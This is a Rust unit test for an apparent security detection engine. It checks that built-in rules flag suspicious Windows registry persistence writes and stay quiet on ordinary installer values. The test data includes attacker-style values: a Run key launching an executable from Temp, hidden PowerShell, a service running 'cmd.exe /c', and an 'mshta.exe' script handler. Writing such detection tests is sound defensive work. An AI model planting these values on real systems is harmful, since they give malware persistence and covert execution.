        // The structural fix this whole field exists for, on the shipped rules.
        // Every event below has the same key shape a normal installer writes;
        // what separates the two halves is the data. Measured on no machine
        // yet — the driver did not carry a value until this build — so this
        // test pins the *rule's meaning*, and the VM run is where the values
        // themselves are measured.
        let run = r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Vendor";
        let service = r"\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\VendorSvc\ImagePath";
        let command = r"\REGISTRY\CLASSES\HKCU\.doc\shell\open\command";
        let app_path = r"\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\app.exe";

        let cases: &[(&str, &str, &str)] = &[
            // Rule, key, value.
            ("BEH-0010", run, r#""C:\Users\me\AppData\Local\Temp\v.exe""#),
            ("BEH-0037", run, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden"),
            ("BEH-0015", service, r#""C:\ProgramData\Vendor\agent.exe" -service"#),
            ("BEH-0038", service, r"cmd.exe /c C:\boot.cmd"),
            ("BEH-0017", command, r#""%LOCALAPPDATA%\Viewer\viewer.exe" "%1""#),
            ("BEH-0039", command, r"mshta.exe about:<script>"),
            ("BEH-0020", app_path, r"C:\Users\me\AppData\Roaming\Vendor\app.exe"),
        ];
        for (rule, path, value) in cases {
            let mut engine = builtin().expect("the shipped rules parse");
            let fired = engine.observe(&registry_value_record(path, Some(value), 10));
            assert!(
                fired.iter().any(|finding| finding.rule_id == *rule),
                "{rule} did not fire on {path} = {value}: {fired:?}"
            );
        }

        // And the half that makes the rule usable: every one of those rules is
        // quiet when the same key is written with ordinary installer data.
        let ordinary: &[(&str, &str)] = &[
            (run, r#""C:\Program Files\Vendor\v.exe""#),
            (service, r#""C:\Program Files\Vendor\agent.exe" -service"#),
            (command, r#""C:\Program Files\Viewer\viewer.exe" "%1""#),
            (app_path, r"C:\Program Files\Vendor\app.exe"),
            // The exact value the VM measured on 2026-10-20 19:37:20, with
            // the user name replaced. It is an `AppData` command line, so the
            // positive condition matches it and only the exclusion can keep
            // it quiet.
            (
                command,
                r#""C:\Users\me\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /url:"%1""#,
            ),
        ];
        for (path, value) in ordinary {
            let mut engine = builtin().expect("the shipped rules parse");
            let fired = engine.observe(&registry_value_record(path, Some(value), 10));
            assert!(
                fired.is_empty(),
                "an ordinary installer write fired {fired:?} on {path} = {value}"
            );
        }

        // The other half of the structural problem, which is that the key alone
        // can no longer convict: a Run value in a writable directory is
        // reported, and one under `Program Files` is not, with the same key
        // path in both cases.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&registry_value_record(
            run,
            Some(r#""%APPDATA%\Vendor\v.exe""#),
            10,
        ));
        assert_eq!(
            fired.iter().map(|f| f.rule_id.as_str()).collect::<Vec<_>>(),
            vec!["BEH-0010"],
            "a Run value in AppData is exactly what the rule is for"
        );

        // The OneDrive exclusion names `onedrive.exe`, not its directory: that
        // directory is user-writable, and a different binary dropped into it
        // is the thing the rule exists to catch.
        let mut engine = builtin().expect("the shipped rules parse");
        let fired = engine.observe(&registry_value_record(
            command,
            Some(r#""C:\Users\me\AppData\Local\Microsoft\OneDrive\evil.exe" "%1""#),
            10,
        ));
        assert_eq!(
            fired.iter().map(|f| f.rule_id.as_str()).collect::<Vec<_>>(),
            vec!["BEH-0017"],
            "the exclusion swallowed a binary it does not name"
        );
    }
}